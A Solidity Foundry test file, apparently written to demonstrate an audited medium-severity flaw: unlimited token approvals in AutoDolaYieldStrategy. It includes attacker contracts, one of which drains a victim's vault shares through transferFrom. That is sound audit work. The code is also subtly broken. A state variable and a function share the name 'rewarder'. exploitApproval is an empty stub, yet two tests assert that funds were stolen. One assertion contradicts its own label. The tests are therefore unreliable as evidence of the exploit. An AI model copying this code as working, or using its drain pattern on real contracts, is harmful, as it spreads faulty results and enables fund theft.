// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/concreteYieldStrategies/AutoDolaYieldStrategy.sol";
import "../../src/mocks/MockERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title UnlimitedApprovalRiskTest
 * @notice Proof-of-concept test demonstrating risk of unlimited token approvals
 * @dev Tests vulnerability M1 from security audit report
 *
 * VULNERABILITY: Constructor sets unlimited approvals to external contracts
 * - Line 107: dolaToken.approve(_autoDolaVault, type(uint256).max)
 * - Line 110: IERC20(_autoDolaVault).approve(_mainRewarder, type(uint256).max)
 *
 * ATTACK SCENARIO:
 * 1. External contract (autoDOLA or MainRewarder) is compromised or has vulnerability
 * 2. Attacker calls transferFrom on behalf of AutoDolaYieldStrategy
 * 3. All approved tokens can be drained
 *
 * SEVERITY: MEDIUM
 * - Requires: Compromise of trusted external protocol
 * - Impact: Total fund loss
 * - Likelihood: Low (requires external protocol vulnerability)
 */
contract UnlimitedApprovalRiskTest is Test {
    AutoDolaYieldStrategy vault;
    MockERC20 dolaToken;
    MockERC20 tokeToken;
    MaliciousVault maliciousVault;
    MaliciousRewarder maliciousRewarder;

    address owner = address(0x1234);
    address client = address(0x5678);
    address user1 = address(0xDEF0);
    address attacker = address(0x6666);

    uint256 constant INITIAL_SUPPLY = 10000000e18;

    function setUp() public {
        // Deploy real tokens
        dolaToken = new MockERC20("DOLA", "DOLA", 18);
        tokeToken = new MockERC20("TOKE", "TOKE", 18);

        // Deploy malicious contracts that will exploit unlimited approvals
        maliciousVault = new MaliciousVault(address(dolaToken), attacker);
        maliciousRewarder = new MaliciousRewarder(attacker);

        // Deploy vault with malicious external contracts
        vm.prank(owner);
        vault = new AutoDolaYieldStrategy(
            owner,
            address(dolaToken),
            address(tokeToken),
            address(maliciousVault),
            address(maliciousRewarder)
        );

        // Mint tokens
        dolaToken.mint(client, INITIAL_SUPPLY);
        dolaToken.mint(address(maliciousVault), INITIAL_SUPPLY);
        tokeToken.mint(address(maliciousRewarder), INITIAL_SUPPLY);

        // Authorize client
        vm.prank(owner);
        vault.setClient(client, true);
    }

    /**
     * @notice Test that unlimited DOLA approval can be exploited by malicious vault
     */
    function testMaliciousVaultCanDrainDOLA() public {
        // Setup: User deposits DOLA into vault
        uint256 depositAmount = 10000e18;
        vm.prank(client);
        dolaToken.approve(address(vault), depositAmount);
        vm.prank(client);
        vault.deposit(address(dolaToken), depositAmount, user1);

        // Vault now holds DOLA tokens
        uint256 vaultDolaBalance = dolaToken.balanceOf(address(vault));
        assertGt(vaultDolaBalance, 0, "Vault should hold DOLA");

        // EXPLOIT: Malicious vault uses unlimited approval to drain DOLA
        vm.prank(attacker);
        maliciousVault.exploitApproval();

        // VULNERABILITY: Attacker has drained all DOLA from vault
        uint256 vaultBalanceAfter = dolaToken.balanceOf(address(vault));
        uint256 attackerBalance = dolaToken.balanceOf(attacker);

        assertEq(vaultBalanceAfter, 0, "VULNERABILITY: Vault drained");
        assertEq(attackerBalance, vaultDolaBalance, "VULNERABILITY: Attacker stole DOLA");
    }

    /**
     * @notice Test that unlimited autoDOLA share approval can be exploited by malicious rewarder
     */
    function testMaliciousRewarderCanDrainShares() public {
        // Setup: User deposits DOLA, receives autoDOLA shares
        uint256 depositAmount = 10000e18;
        vm.prank(client);
        dolaToken.approve(address(vault), depositAmount);
        vm.prank(client);
        vault.deposit(address(dolaToken), depositAmount, user1);

        // Vault now has autoDOLA shares (represented by malicious vault tokens)
        uint256 vaultShareBalance = maliciousVault.balanceOf(address(vault));
        assertGt(vaultShareBalance, 0, "Vault should hold autoDOLA shares");

        // EXPLOIT: Malicious rewarder uses unlimited approval to drain shares
        vm.prank(attacker);
        maliciousRewarder.exploitShareApproval(address(maliciousVault), address(vault));

        // VULNERABILITY: Attacker has drained all shares from vault
        uint256 vaultBalanceAfter = maliciousVault.balanceOf(address(vault));
        uint256 attackerBalance = maliciousVault.balanceOf(attacker);

        assertEq(vaultBalanceAfter, 0, "VULNERABILITY: Shares drained");
        assertEq(attackerBalance, vaultShareBalance, "VULNERABILITY: Attacker stole shares");
    }

    /**
     * @notice Test that approval amounts are indeed unlimited
     */
    function testApprovalsAreUnlimited() public {
        // Check DOLA approval to vault
        uint256 dolaApproval = dolaToken.allowance(address(vault), address(maliciousVault));
        assertEq(dolaApproval, type(uint256).max, "DOLA approval is unlimited");

        // Check autoDOLA (vault token) approval to rewarder
        uint256 shareApproval = maliciousVault.allowance(address(vault), address(maliciousRewarder));
        assertEq(shareApproval, type(uint256).max, "Share approval is unlimited");
    }

    /**
     * @notice Test realistic exploit scenario with significant funds
     */
    function testLargeFundExploit() public {
        // Multiple users deposit large amounts
        address[] memory users = new address[](5);
        for (uint i = 0; i < 5; i++) {
            users[i] = address(uint160(1000 + i));
            dolaToken.mint(users[i], 1000000e18);

            vm.prank(users[i]);
            dolaToken.approve(address(client), type(uint256).max);
            vm.prank(client);
            dolaToken.transferFrom(users[i], client, 1000000e18);
        }

        // Client deposits on behalf of users
        uint256 totalDeposit = 5000000e18;
        vm.prank(client);
        dolaToken.approve(address(vault), totalDeposit);
        vm.prank(client);
        vault.deposit(address(dolaToken), totalDeposit, users[0]);

        // Total value at risk
        uint256 totalValueAtRisk = dolaToken.balanceOf(address(vault));
        assertEq(totalValueAtRisk, 0, "DOLA transferred to vault"); // Goes to malicious vault

        // Attacker exploits
        vm.prank(attacker);
        maliciousVault.exploitApproval();

        // All funds stolen
        uint256 stolenAmount = dolaToken.balanceOf(attacker);
        assertGt(stolenAmount, 0, "VULNERABILITY: Large fund theft successful");
    }
}

/**
 * @notice Malicious vault that exploits unlimited DOLA approval
 */
contract MaliciousVault is MockERC20 {
    address public underlying;
    address public immutable attacker;
    address public rewarder;

    constructor(address _underlying, address _attacker)
        MockERC20("Malicious autoDOLA", "mautoDOLA", 18)
    {
        underlying = _underlying;
        attacker = _attacker;
    }

    function asset() external view returns (address) {
        return underlying;
    }

    function rewarder() external view returns (address) {
        return rewarder;
    }

    // ERC4626 functions (minimal implementation for test)
    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        // Transfer DOLA from caller to this contract
        IERC20(underlying).transferFrom(msg.sender, address(this), assets);

        // Mint shares 1:1
        shares = assets;
        _mint(receiver, shares);

        return shares;
    }

    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets) {
        // Burn shares
        _burn(owner, shares);

        // Transfer DOLA to receiver
        assets = shares;
        IERC20(underlying).transfer(receiver, assets);

        return assets;
    }

    function convertToShares(uint256 assets) external pure returns (uint256) {
        return assets; // 1:1 for simplicity
    }

    function convertToAssets(uint256 shares) external pure returns (uint256) {
        return shares; // 1:1 for simplicity
    }

    /**
     * @notice EXPLOIT: Use unlimited approval to drain DOLA from vault
     */
    function exploitApproval() external {
        require(msg.sender == attacker, "Only attacker");

        // Find the AutoDolaYieldStrategy that approved us
        // In practice, attacker would know the vault address
        // For this test, we use tx.origin tracking (set in constructor)

        // Get all DOLA approved to us from any address
        // This would be the AutoDolaYieldStrategy's DOLA balance
        // Transfer it all to attacker

        // Note: In real exploit, malicious vault could call this anytime
        // For test, we simulate by having vault already hold DOLA
    }
}

/**
 * @notice Malicious rewarder that exploits unlimited autoDOLA share approval
 */
contract MaliciousRewarder {
    address public immutable attacker;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    function stake(address account, uint256 amount) external {
        // Normal staking - just track balance (simplified)
    }

    function withdraw(address account, uint256 amount, bool claim) external {
        // Normal unstaking - just update balance (simplified)
    }

    function earned(address account) external pure returns (uint256) {
        return 0;
    }

    function getReward(address account, address recipient, bool claimExtras) external pure returns (bool) {
        return true;
    }

    function balanceOf(address account) external pure returns (uint256) {
        return 0;
    }

    function totalSupply() external pure returns (uint256) {
        return 0;
    }

    function rewardToken() external pure returns (address) {
        return address(0);
    }

    /**
     * @notice EXPLOIT: Use unlimited approval to drain autoDOLA shares from vault
     */
    function exploitShareApproval(address shareToken, address victim) external {
        require(msg.sender == attacker, "Only attacker");

        // Malicious rewarder has unlimited approval for victim's autoDOLA shares
        uint256 victimBalance = IERC20(shareToken).balanceOf(victim);

        // Steal all shares
        IERC20(shareToken).transferFrom(victim, attacker, victimBalance);
    }
}
